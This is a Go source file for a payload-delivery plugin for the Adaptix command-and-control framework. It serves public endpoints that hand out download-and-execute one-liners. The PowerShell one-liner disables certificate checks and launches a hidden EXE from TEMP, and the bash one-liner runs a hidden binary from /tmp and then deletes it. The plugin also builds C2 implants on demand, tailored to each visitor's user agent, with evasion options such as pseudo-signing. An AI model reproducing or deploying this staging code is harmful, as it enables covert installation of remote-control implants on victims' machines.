package main

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	adaptix "github.com/Adaptix-Framework/axc2"
	"golang.org/x/sync/singleflight"
	"gopkg.in/yaml.v3"
)

type PluginService struct{}

var (
	Ts         Teamserver
	ModuleDir  string
	Config     WebDeliveryConfig
	cache      sync.Map
	configLock sync.Mutex
	buildGroup singleflight.Group
)

type Teamserver interface {
	TsEndpointRegister(method string, path string, handler func(username string, body []byte) (int, []byte)) error
	TsEndpointRegisterPublicRaw(method string, path string, handler func(w http.ResponseWriter, r *http.Request)) error
	TsAgentBuildSyncOnce(agentName string, config string, listenersName []string) ([]byte, string, error)
	TsServiceSendDataClient(operator string, service string, data string)
	TsServiceSendDataAll(service string, data string)
}

// WebDeliveryConfig is operator-facing config.
// Defaults are Beacon/Exe oriented (multi-agent era), not legacy Gopher-only.
type WebDeliveryConfig struct {
	ScriptRoute  string `yaml:"script_route" json:"script_route"`
	PayloadRoute string `yaml:"payload_route" json:"payload_route"`
	Listener     string `yaml:"listener" json:"listener"`
	AgentName    string `yaml:"agent_name" json:"agent_name"`
	AgentFormat  string `yaml:"format" json:"format"`
	// Optional fixed arch; empty = auto from UA (mapped per agent)
	Arch        string `yaml:"arch" json:"arch"`
	Sleep       string `yaml:"sleep" json:"sleep"`
	Jitter      int    `yaml:"jitter" json:"jitter"`
	CacheTTLMin int    `yaml:"cache_ttl_min" json:"cache_ttl_min"`
	C2HostURL   string `yaml:"c2_host_url" json:"c2_host_url"`
}

type CacheEntry struct {
	Payload  []byte
	Filename string
	BuiltAt  time.Time
}

func InitPlugin(ts any, moduleDir string, serviceConfig string) adaptix.PluginService {
	Ts = ts.(Teamserver)
	ModuleDir = moduleDir

	err := yaml.Unmarshal([]byte(serviceConfig), &Config)
	if err != nil {
		fmt.Println("[WebDelivery] Error parsing initial config:", err)
	}
	normalizeConfig(&Config)

	// Register Public Endpoints
	Ts.TsEndpointRegisterPublicRaw("GET", Config.ScriptRoute, handleScript)
	Ts.TsEndpointRegisterPublicRaw("GET", Config.PayloadRoute, handlePayload)

	// Register Management Endpoints
	Ts.TsEndpointRegister("POST", "/webdelivery/config", handleConfigUpdate)
	Ts.TsEndpointRegister("POST", "/webdelivery/status", handleStatus)

	// Background cache cleanup — evicts stale entries every 5 minutes
	go func() {
		ticker := time.NewTicker(5 * time.Minute)
		defer ticker.Stop()
		for range ticker.C {
			now := time.Now()
			cache.Range(func(key, value interface{}) bool {
				entry := value.(CacheEntry)
				if Config.CacheTTLMin > 0 && now.Sub(entry.BuiltAt) > time.Duration(Config.CacheTTLMin)*time.Minute {
					cache.Delete(key)
				}
				return true
			})
		}
	}()

	fmt.Printf("[WebDelivery] Service initialized. Script: %s, Payload: %s, agent=%s format=%s\n",
		Config.ScriptRoute, Config.PayloadRoute, Config.AgentName, Config.AgentFormat)

	return &PluginService{}
}

func (p *PluginService) Call(operator string, function string, args string) {}

func normalizeConfig(c *WebDeliveryConfig) {
	if c.ScriptRoute == "" {
		c.ScriptRoute = "/deliver"
	}
	if c.PayloadRoute == "" {
		c.PayloadRoute = "/deliver/payload"
	}
	if c.AgentName == "" {
		c.AgentName = "beacon"
	}
	c.AgentName = strings.ToLower(strings.TrimSpace(c.AgentName))
	// legacy aliases
	if c.AgentName == "beacon_agent" {
		c.AgentName = "beacon"
	}
	if c.AgentName == "linux_agent" {
		c.AgentName = "linux"
	}
	if c.AgentName == "gopher_agent" {
		c.AgentName = "gopher"
	}

	// Legacy default was Gopher-only "Artifact Go Exe". Map to current agents.
	if c.AgentFormat == "" || c.AgentFormat == "Artifact Go Exe" {
		switch c.AgentName {
		case "gopher":
			c.AgentFormat = "Binary EXE"
		case "linux":
			c.AgentFormat = "Binary ELF (Native)"
		default:
			c.AgentFormat = "Exe"
			c.AgentName = "beacon"
		}
	}

	if c.Sleep == "" {
		c.Sleep = "5s"
	}
	if c.CacheTTLMin < 0 {
		c.CacheTTLMin = 0
	}
	c.C2HostURL = normalizeC2Host(c.C2HostURL)
}

// normalizeC2Host keeps only a real teamserver API origin (scheme + /api).
// Listener bind addresses like "203.0.113.10:4433" must not become deliver URLs.
func normalizeC2Host(u string) string {
	u = strings.TrimSpace(u)
	if u == "" {
		return ""
	}
	if !strings.HasPrefix(u, "http://") && !strings.HasPrefix(u, "https://") {
		return ""
	}
	u = strings.TrimRight(u, "/")
	if !strings.Contains(u, "/api") {
		return u + "/api"
	}
	return u
}

func handleConfigUpdate(username string, body []byte) (int, []byte) {
	configLock.Lock()
	defer configLock.Unlock()

	var newConfig WebDeliveryConfig
	if err := json.Unmarshal(body, &newConfig); err != nil {
		fmt.Printf("[WebDelivery] Config update error: %v\n", err)
		resp, _ := json.Marshal(map[string]interface{}{"ok": false, "message": err.Error()})
		return 400, resp
	}

	normalizeConfig(&newConfig)
	// Keep routes stable after first register (dynamic re-register not wired).
	// If operator changes routes, warn and keep old public paths.
	if newConfig.ScriptRoute != Config.ScriptRoute || newConfig.PayloadRoute != Config.PayloadRoute {
		fmt.Printf("[WebDelivery] route change requested script %s->%s payload %s->%s (public routes stay as first init until server restart)\n",
			Config.ScriptRoute, newConfig.ScriptRoute, Config.PayloadRoute, newConfig.PayloadRoute)
	}
	Config = newConfig
	fmt.Printf("[WebDelivery] Config updated by %s. Listener: %s, Agent: %s, Format: %s, Arch: %s\n",
		username, Config.Listener, Config.AgentName, Config.AgentFormat, Config.Arch)

	// Clear cache on config change
	cache = sync.Map{}
	saveConfig()

	resp, _ := json.Marshal(map[string]interface{}{"ok": true})
	return 200, resp
}

func saveConfig() {
	configPath := filepath.Join(ModuleDir, "config.yaml")

	configYaml, err := yaml.Marshal(&Config)
	if err != nil {
		fmt.Printf("[WebDelivery] Error marshaling config for save: %v\n", err)
		return
	}

	type ExConfig struct {
		ExtenderType  string `yaml:"extender_type"`
		ExtenderFile  string `yaml:"extender_file"`
		ServiceName   string `yaml:"service_name"`
		ServiceConfig string `yaml:"service_config"`
	}

	full := ExConfig{
		ExtenderType:  "service",
		ExtenderFile:  "webdelivery.so",
		ServiceName:   "webdelivery",
		ServiceConfig: string(configYaml),
	}

	data, err := yaml.Marshal(&full)
	if err != nil {
		fmt.Printf("[WebDelivery] Error marshaling config for save: %v\n", err)
		return
	}

	err = os.WriteFile(configPath, data, 0644)
	if err != nil {
		fmt.Printf("[WebDelivery] Error saving config to %s: %v\n", configPath, err)
	} else {
		fmt.Printf("[WebDelivery] Config persisted to %s\n", configPath)
	}
}

func handleStatus(username string, body []byte) (int, []byte) {
	cacheSize := 0
	cache.Range(func(key, value interface{}) bool {
		cacheSize++
		return true
	})

	resp, _ := json.Marshal(map[string]interface{}{
		"ok":            true,
		"script_route":  Config.ScriptRoute,
		"payload_route": Config.PayloadRoute,
		"listener":      Config.Listener,
		"agent_name":    Config.AgentName,
		"format":        Config.AgentFormat,
		"arch":          Config.Arch,
		"sleep":         Config.Sleep,
		"jitter":        Config.Jitter,
		"cache_ttl_min": Config.CacheTTLMin,
		"cache_entries": cacheSize,
		"c2_host_url":   Config.C2HostURL,
	})
	return 200, resp
}

func publicBaseURL(r *http.Request) string {
	baseURL := normalizeC2Host(Config.C2HostURL)
	if baseURL != "" {
		return strings.TrimSuffix(baseURL, "/")
	}
	scheme := "http"
	if r.TLS != nil || r.Header.Get("X-Forwarded-Proto") == "https" {
		scheme = "https"
	}
	baseURL = fmt.Sprintf("%s://%s", scheme, r.Host)
	// When request hits /api/deliver, keep /api prefix for payload URL.
	if strings.HasSuffix(r.URL.Path, Config.ScriptRoute) {
		prefix := strings.TrimSuffix(r.URL.Path, Config.ScriptRoute)
		baseURL += prefix
	} else if strings.HasSuffix(r.URL.Path, Config.PayloadRoute) {
		prefix := strings.TrimSuffix(r.URL.Path, Config.PayloadRoute)
		baseURL += prefix
	}
	return strings.TrimSuffix(baseURL, "/")
}

// scriptWantPS decides PowerShell vs bash body for /deliver.
// Priority: ?d=ps|powershell|win  /  ?d=bash|sh|linux  → agent default → UA.
// Empty WebClient UA has no "windows"; beacon forces PS; empty UA otherwise defaults PS
// (Windows one-liner is the common entry). Explicit curl/linux UA gets bash.
func scriptWantPS(r *http.Request, ua string) bool {
	d := strings.ToLower(strings.TrimSpace(r.URL.Query().Get("d")))
	switch d {
	case "ps", "powershell", "win", "windows", "pwsh":
		return true
	case "bash", "sh", "linux", "unix", "curl", "wget":
		return false
	}

	switch strings.ToLower(strings.TrimSpace(Config.AgentName)) {
	case "beacon", "beacon_agent":
		return true
	case "linux", "linux_agent":
		return false
	}

	if strings.Contains(ua, "windows") || strings.Contains(ua, "powershell") || strings.Contains(ua, "msie") {
		return true
	}
	if strings.Contains(ua, "linux") || strings.Contains(ua, "darwin") ||
		strings.Contains(ua, "macintosh") || strings.Contains(ua, "curl/") ||
		strings.Contains(ua, "wget") || strings.Contains(ua, "freebsd") {
		return false
	}
	// empty / generic UA (WebClient, IWR defaults, etc.)
	return true
}

func handleScript(w http.ResponseWriter, r *http.Request) {
	ua := strings.ToLower(r.UserAgent())
	ip := r.RemoteAddr
	wantPS := scriptWantPS(r, ua)
	fmt.Printf("[WebDelivery] Script request from %s (UA: %s dialect=%s)\n",
		ip, ua, map[bool]string{true: "ps", false: "bash"}[wantPS])

	payloadURL := publicBaseURL(r) + Config.PayloadRoute

	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store")
	var rnd [4]byte
	rand.Read(rnd[:])
	if wantPS {
		// Use [bool]1 not $true: outer PowerShell expands $true → True and breaks SSL callback.
		fmt.Fprintf(w, `$p="$env:TEMP\%x.exe"; [Net.ServicePointManager]::ServerCertificateValidationCallback={param($a,$b,$c,$d)[bool]1}; [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile("%s",$p); Start-Process $p -WindowStyle Hidden`,
			rnd, payloadURL)
	} else {
		fmt.Fprintf(w, "#!/bin/bash\np=\"/tmp/.%x\"\nt=\"${p}.tmp\"\ncurl -skL --http1.1 \"%s\" -o \"$t\"\nchmod +x \"$t\"\nmv -f \"$t\" \"$p\"\n\"$p\" &\nsleep 5\nrm -f \"$p\"\n",
			rnd, payloadURL)
	}
}

// detectOsArch returns coarse OS + generic arch from UA.
// arch is later remapped per agent (beacon x64/x86, gopher amd64/arm64, linux x86_64/ARM64).
// Empty UA: prefer windows (common WebClient / certutil / bits entry); agent layer may force OS.
func detectOsArch(ua string) (string, string) {
	ua = strings.ToLower(strings.TrimSpace(ua))
	osType := "windows"
	arch := "x64"

	if strings.Contains(ua, "linux") || strings.Contains(ua, "curl/") || strings.Contains(ua, "wget") ||
		strings.Contains(ua, "freebsd") || strings.Contains(ua, "android") {
		osType = "linux"
	} else if strings.Contains(ua, "darwin") || strings.Contains(ua, "macintosh") || strings.Contains(ua, "mac os") {
		osType = "macos"
	} else if strings.Contains(ua, "windows") || strings.Contains(ua, "powershell") ||
		strings.Contains(ua, "msie") || strings.Contains(ua, "winhttp") || ua == "" {
		osType = "windows"
	}

	if strings.Contains(ua, "arm64") || strings.Contains(ua, "aarch64") || strings.Contains(ua, "armv8") {
		arch = "arm64"
	} else if osType == "macos" && strings.Contains(ua, "arm") && !strings.Contains(ua, "x86") {
		arch = "arm64"
	} else if strings.Contains(ua, "wow64") {
		// 32-bit process on 64-bit Windows — still deliver x64 by default for beacon
		arch = "x64"
	} else if strings.Contains(ua, "x86_64") || strings.Contains(ua, "win64") ||
		strings.Contains(ua, "amd64") || strings.Contains(ua, "x64") {
		arch = "x64"
	} else if strings.Contains(ua, "i686") || strings.Contains(ua, "i386") ||
		(strings.Contains(ua, "x86") && !strings.Contains(ua, "x86_64")) {
		arch = "x86"
	}

	return osType, arch
}

func mapArchForAgent(agent, osType, arch string) (string, error) {
	a := strings.ToLower(strings.TrimSpace(arch))
	switch agent {
	case "beacon":
		// beacon only windows x64/x86
		if osType != "windows" {
			// force windows profile; one-liner for non-windows will fail at runtime anyway
			osType = "windows"
		}
		if a == "amd64" || a == "x86_64" || a == "x64" || a == "" {
			return "x64", nil
		}
		if a == "x86" || a == "i386" || a == "i686" {
			return "x86", nil
		}
		return "x64", nil
	case "gopher":
		if a == "x64" || a == "x86_64" || a == "amd64" || a == "" {
			return "amd64", nil
		}
		if a == "arm64" || a == "aarch64" {
			return "arm64", nil
		}
		return "amd64", nil
	case "linux":
		if a == "arm64" || a == "aarch64" {
			return "ARM64", nil
		}
		// linux agent uses x86_64 / ARM64 labels
		return "x86_64", nil
	default:
		return "", fmt.Errorf("unsupported agent %q (use beacon|gopher|linux)", agent)
	}
}

func mapFormatForAgent(agent, osType, format string) string {
	f := strings.TrimSpace(format)
	switch agent {
	case "beacon":
		switch f {
		case "Exe", "Service Exe", "DLL", "Shellcode", "Hex C", "Stager":
			return f
		case "Binary EXE", "Artifact Go Exe":
			return "Exe"
		default:
			return "Exe"
		}
	case "gopher":
		// gopher format is OS-bound
		switch strings.ToLower(osType) {
		case "windows":
			return "Binary EXE"
		case "macos":
			return "Binary Mach-O"
		default:
			return "Binary .ELF"
		}
	case "linux":
		switch f {
		case "Stager", "Binary ELF (Native)", "Shared Object (Native)",
			"Shellcode x86_64 (Native)", "Shellcode ARM64 (Native)":
			return f
		default:
			return "Binary ELF (Native)"
		}
	default:
		return f
	}
}

func buildAgentConfigJSON(agent, osType, arch, format string) ([]byte, error) {
	cfg := map[string]interface{}{}
	switch agent {
	case "beacon":
		// Match Generate.tsx / defaultAgentConfig production defaults
		cfg["os"] = "windows"
		cfg["arch"] = arch
		cfg["format"] = format
		cfg["sleep"] = Config.Sleep
		if Config.Sleep == "" {
			cfg["sleep"] = "5s"
		}
		cfg["jitter"] = Config.Jitter
		cfg["iat_hiding"] = false
		cfg["exe_pseudo_sign"] = (format == "Exe" || format == "Service Exe")
		cfg["pe_header_mod"] = (format == "Exe" || format == "Service Exe" || format == "DLL")
	case "gopher":
		cfg["os"] = osType
		if osType == "" {
			cfg["os"] = "windows"
		}
		cfg["arch"] = arch
		cfg["format"] = format
		// gopher reconn fields (seconds as string in some UIs)
		cfg["reconn_timeout"] = Config.Sleep
		if Config.Sleep == "" {
			cfg["reconn_timeout"] = "10"
		}
		cfg["reconn_count"] = 10
		cfg["exe_pseudo_sign"] = (format == "Binary EXE")
	case "linux":
		cfg["arch"] = arch
		cfg["format"] = format
		cfg["reconn_timeout"] = Config.Sleep
		if Config.Sleep == "" {
			cfg["reconn_timeout"] = "10"
		}
		cfg["reconn_count"] = 1000
		cfg["opsec_enabled"] = false
	default:
		return nil, fmt.Errorf("unsupported agent %q", agent)
	}
	return json.Marshal(cfg)
}

func handlePayload(w http.ResponseWriter, r *http.Request) {
	ua := strings.ToLower(r.UserAgent())
	ip := r.RemoteAddr
	osType, archHint := detectOsArch(ua)

	// Explicit query overrides (product delivery: force arch/os from one-liner family)
	// e.g. /deliver/payload?arch=x86  /deliver/payload?os=linux&arch=arm64
	if q := strings.TrimSpace(r.URL.Query().Get("os")); q != "" {
		switch strings.ToLower(q) {
		case "win", "windows", "w":
			osType = "windows"
		case "linux", "lin", "unix":
			osType = "linux"
		case "mac", "macos", "darwin", "osx":
			osType = "macos"
		}
	}
	if q := strings.TrimSpace(r.URL.Query().Get("arch")); q != "" {
		archHint = q
	}
	// Operator-fixed arch overrides UA (but not stronger than ?arch= if set)
	if strings.TrimSpace(r.URL.Query().Get("arch")) == "" && strings.TrimSpace(Config.Arch) != "" {
		archHint = Config.Arch
	}

	agent := Config.AgentName
	if agent == "" {
		agent = "beacon"
	}

	arch, err := mapArchForAgent(agent, osType, archHint)
	if err != nil {
		http.Error(w, err.Error(), 400)
		return
	}
	format := mapFormatForAgent(agent, osType, Config.AgentFormat)

	// Beacon is Windows-only: non-windows UA still gets windows payload if agent=beacon
	if agent == "beacon" {
		osType = "windows"
	}
	// linux agent is Linux-only
	if agent == "linux" {
		osType = "linux"
	}

	fmt.Printf("[WebDelivery] Payload request from %s | agent=%s os=%s arch=%s format=%s listener=%s ua=%q\n",
		ip, agent, osType, arch, format, Config.Listener, ua)

	if strings.TrimSpace(Config.Listener) == "" {
		http.Error(w, "WebDelivery listener not configured", 500)
		return
	}

	configJSON, err := buildAgentConfigJSON(agent, osType, arch, format)
	if err != nil {
		http.Error(w, err.Error(), 400)
		return
	}

	// Cache key includes full config so format/arch/sleep changes invalidate
	hasher := sha256.New()
	hasher.Write([]byte(agent + "|" + Config.Listener + "|" + format + "|" + arch + "|" + osType + "|" + string(configJSON)))
	cacheKey := hex.EncodeToString(hasher.Sum(nil))

	if Config.CacheTTLMin > 0 {
		if val, ok := cache.Load(cacheKey); ok {
			entry := val.(CacheEntry)
			if time.Since(entry.BuiltAt) < time.Duration(Config.CacheTTLMin)*time.Minute {
				fmt.Printf("[WebDelivery] Serving %s from cache for %s (%d bytes)\n", agent, ip, len(entry.Payload))
				serveBinary(w, entry.Payload, entry.Filename)
				return
			}
		}
	}

	fmt.Printf("[WebDelivery] Building fresh %s for %s (Format: %s Arch: %s)...\n", agent, ip, format, arch)
	result, err, _ := buildGroup.Do(cacheKey, func() (interface{}, error) {
		payload, filename, err := Ts.TsAgentBuildSyncOnce(agent, string(configJSON), []string{Config.Listener})
		if err != nil {
			return nil, err
		}
		if Config.CacheTTLMin > 0 {
			cache.Store(cacheKey, CacheEntry{
				Payload:  payload,
				Filename: filename,
				BuiltAt:  time.Now(),
			})
		}
		return &CacheEntry{Payload: payload, Filename: filename, BuiltAt: time.Now()}, nil
	})
	if err != nil {
		fmt.Printf("[WebDelivery] Build failed: %v\n", err)
		http.Error(w, "Build error: "+err.Error(), 500)
		return
	}
	entry := result.(*CacheEntry)
	serveBinary(w, entry.Payload, entry.Filename)
}

func serveBinary(w http.ResponseWriter, payload []byte, filename string) {
	if filename == "" {
		filename = "payload.bin"
	}
	w.Header().Set("Content-Disposition", "attachment; filename="+filename)
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(payload)))
	w.Write(payload)
}
